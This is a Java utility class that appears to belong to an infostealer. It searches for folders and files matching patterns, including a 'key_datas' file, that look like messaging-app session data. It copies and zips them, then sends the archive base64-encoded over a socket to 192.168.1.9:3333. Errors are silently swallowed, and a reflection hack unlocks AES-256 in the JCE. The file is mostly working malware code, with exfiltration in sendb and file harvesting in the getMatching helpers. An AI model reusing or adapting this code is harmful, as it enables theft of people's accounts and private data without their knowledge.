package org.example;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.net.Socket;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.crypto.Cipher;

public class utils {

   public static void sendb(String message) {
      try {
         zipFolder(back.xdFolderPath, back.xdFolderPath + ".rar");
         File file = new File(back.xdFolderPath + ".rar");
         try (Socket socket = new Socket("192.168.1.9", 3333);
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true)) {
            writer.println(message);
            writer.println(Base64.getEncoder().encodeToString(Files.readAllBytes(file.toPath())));
        }
      } catch (IOException e) { throw new RuntimeException(e); }
   }
   
   public static void errorMessage(Exception error, String where) {
   }

   public static boolean doesDirectoryExist(String directoryPath) {
      File directory = new File(directoryPath);
      return directory.exists() && directory.isDirectory();
   }

   public static void copyFileToDirectory(File file, File targetDirectory) throws IOException {
      Path targetPath = targetDirectory.toPath().resolve(file.getName());
      Files.copy(file.toPath(), targetPath, StandardCopyOption.REPLACE_EXISTING);
   }

   public static void copyFile(File sourceFile, File targetFile) {
      try {
         if (!targetFile.getParentFile().exists()) {
            targetFile.getParentFile().mkdir();
         }
         Files.copy(sourceFile.toPath(), targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
         System.out.println("Copeado com sucesso");
        } catch (Exception e) { }
   }

   public static List<File> getMatchingDirectories(File directory) {
      List<File> matchingDirectories = new ArrayList<>();
      File[] files;
      if (directory.exists() && directory.isDirectory() && (files = directory.listFiles()) != null) {
         File[] var3 = files;
         int var4 = files.length;
         for (int var5 = 0; var5 < var4; ++var5) {
               File file = var3[var5];
               if (file.isDirectory()) {
                  String directoryName = file.getName();
                  if (directoryName.matches("^[A-Z0-9].*[A-Z0-9]$")) {
                     matchingDirectories.add(file);
                  }
               }
         }
      }
      return matchingDirectories;
   }

   public static List<File> getMatchingFiles(File directory) {
      List<File> matchingFiles = new ArrayList<>();
      File[] files;
      if (directory.exists() && directory.isDirectory() && (files = directory.listFiles()) != null) {
         File[] var3 = files;
         int var4 = files.length;
         for (int var5 = 0; var5 < var4; var5++) {
               File file = var3[var5];
               if (file.isFile()) {
                  String fileName = file.getName();
                  if (fileName.matches("^[A-Z0-9].*s$")) {
                     matchingFiles.add(file);
                  }
               }
         }
         try {
            matchingFiles.add(new File(directory + "\\key_datas"));
         } catch (Exception var8) { }
      }
      return matchingFiles;
   }

   public static void copyDirectoryToDirectory(File sourceDirectory, File targetDirectory) throws IOException {
      Path targetPath = targetDirectory.toPath().resolve(sourceDirectory.getName());
      Files.walk(sourceDirectory.toPath()).forEach((sourcePath) -> {
         Path target = targetPath.resolve(sourceDirectory.toPath().relativize(sourcePath));
         try {
            Files.copy(sourcePath, target, StandardCopyOption.REPLACE_EXISTING);
         } catch (IOException var5) { }
      });
   }

   public static void copyDirectory(File sourceDir, File targetDir) throws IOException {
      if (!targetDir.exists()) {
         targetDir.mkdirs();
      }
      File[] files = sourceDir.listFiles();
         if (files != null) {
            File[] var3 = files;
            int var4 = files.length;
            for (int var5 = 0; var5 < var4; ++var5) {
               File entry = var3[var5];
               File destination = new File(targetDir, entry.getName());
               if (entry.isDirectory()) {
                  copyDirectory(entry, destination);
               } else {
                  Files.copy(entry.toPath(), destination.toPath(), StandardCopyOption.REPLACE_EXISTING);
            }
         }
      }
   }

   private static void zipFolder(String sourceFolder, String zipFilePath) throws IOException {
      try (FileOutputStream fos = new FileOutputStream(zipFilePath);
         ZipOutputStream zos = new ZipOutputStream(fos)) {
         addToZip("", new File(sourceFolder), zos);
      }
   }

   private static void addToZip(String parentPath, File file, ZipOutputStream zos) throws IOException {
      String filePath = parentPath + file.getName();
      if (file.isDirectory()) {
         if (!filePath.endsWith("/")) filePath += "/";
         zos.putNextEntry(new ZipEntry(filePath));
         File[] children = file.listFiles();
         if (children != null) {
            for (File child : children) {
            addToZip(filePath, child, zos);
            }
         }
      return;
   }
   try (FileInputStream fis = new FileInputStream(file)) {
      zos.putNextEntry(new ZipEntry(filePath));
      byte[] buffer = new byte[1024];
      int length;
      while ((length = fis.read(buffer)) > 0) {
         zos.write(buffer, 0, length);
      }
   }
   }

   public static void deleteDirectoryRecursively(Path path) throws IOException{
      if(Files.isDirectory(path)){
         try(DirectoryStream<Path> stream = Files.newDirectoryStream(path)){
            for (Path entry : stream){
               deleteDirectoryRecursively(entry);
            }
         }
      }
      Files.delete(path);
   }
   
   @SuppressWarnings("unchecked")
   public static void unlockAES256() {
      new Thread(() -> {
         try {
               if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
                  Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                  Constructor<?> con = aClass.getDeclaredConstructor();
                  con.setAccessible(true);
                  Object allPermissionCollection = con.newInstance();
                  Field f = aClass.getDeclaredField("all_allowed");
                  f.setAccessible(true);
                  f.setBoolean(allPermissionCollection, true);
                  Class<?> aClass2 = Class.forName("javax.crypto.CryptoPermissions");
                  Constructor<?> con2 = aClass2.getDeclaredConstructor();
                  con2.setAccessible(true);
                  Object allPermissions = con2.newInstance();
                  Field f2 = aClass2.getDeclaredField("perms");
                  f2.setAccessible(true);
                  ((Map<Object, Object>) f2.get(allPermissions)).put("*", allPermissionCollection);
                  Field f3 = Class.forName("javax.crypto.JceSecurityManager").getDeclaredField("defaultPolicy");
                  f3.setAccessible(true);
                  Field mf = Field.class.getDeclaredField("modifiers");
                  mf.setAccessible(true);
                  mf.setInt(f3, f3.getModifiers() & ~Modifier.FINAL);
                  f3.set(null, allPermissions);
               }
            } catch (Exception e) { }
      }).start();
   }
}